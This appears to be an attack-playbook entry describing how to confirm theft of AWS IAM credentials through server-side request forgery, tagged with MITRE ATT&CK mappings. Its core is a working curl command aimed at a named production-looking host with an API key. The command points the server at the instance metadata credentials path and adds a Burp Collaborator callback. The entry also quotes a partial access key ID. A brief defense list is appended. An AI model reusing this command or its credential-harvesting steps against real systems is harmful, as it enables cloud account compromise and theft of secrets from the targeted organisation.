---
id: proc-uuid-2
tags:
  - ssrf
  - aws-credentials
  - exfiltration
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Credential Access]]'
commands:
  - '[[commands/exploit-ssrf-fetch-aws-credentials]]'
verified: false
platforms:
  - Web
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Application Access Token]]'
updated_at: '2025-12-14T04:08:46.136Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Steal Application Access Token]]'
---
# Verify-AWS-Credentials-Retrieval-via-SSRF

## Summary

This procedure verifies the successful retrieval of AWS IAM credentials through the SSRF vulnerability, analyzing the response for AccessKeyId, SecretAccessKey, and Token to confirm exfiltration.

## Description

Following the SSRF trigger, the server fetches and returns the contents of the AWS metadata endpoint /latest/meta-data/iam/security-credentials/ecsInstanceRole. The JSON response contains temporary credentials valid until expiration. This step focuses on parsing and validating the output in Burp Suite, ensuring the credentials are usable for further AWS actions like S3 enumeration. Prerequisites: Successful Step 1 execution.

## Requirements

1. Burp Suite with response viewer
2. Knowledge of AWS IAM response format
3. Optional: AWS CLI for credential testing (without execution)

## Defense

Defensive measures and detection strategies:

- Disable or restrict metadata service access on EC2 instances
- Implement credential rotation and short-lived tokens
- Log and alert on anomalous API calls from application servers
- Use AWS CloudTrail to monitor IAM credential usage

## Objectives

1. Extract and validate IAM credentials from SSRF response
2. Assess potential for credential abuse
3. Document for vulnerability reporting

## Instructions

### Step 1: Analyze SSRF Response

**Context**: Inspect the HTTP response body in Burp Repeater for the JSON payload containing credentials.

Use the output from [[commands/exploit-ssrf-fetch-aws-credentials]]:

```bash
curl -X POST "https://cognitive.topcoder.com/community-app-assets/api/proxy-post" \
  -H "Authorization: ApiKey 130edef6-2289-4407-bfcf-3eedacebb860" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2FecsInstanceRole%3Fu%3D65bd5a1857b73643aad556093%26id%3D934e9ffdc5&EMAIL=eviltwin%404w15ul5vh79meeab3xqz2jk45vbpze.burpcollaborator.net"
```

> Look for {"Code":"Success","AccessKeyId":"ASIAV6SVWBIPVJNDI4LO",...}. Verify Expiration is in the future.

### Step 2: Check for OOB Confirmation

**Context**: Review Burp Collaborator for DNS or HTTP interactions indicating server-side request.

No additional command; monitor Collaborator payload.

> Success if callbacks appear, confirming SSRF.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]]

### Techniques

- [[Steal Application Access Token]]

### Sub-Techniques


## Commands Used

- [[commands/exploit-ssrf-fetch-aws-credentials]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- credential-access
- aws-iam
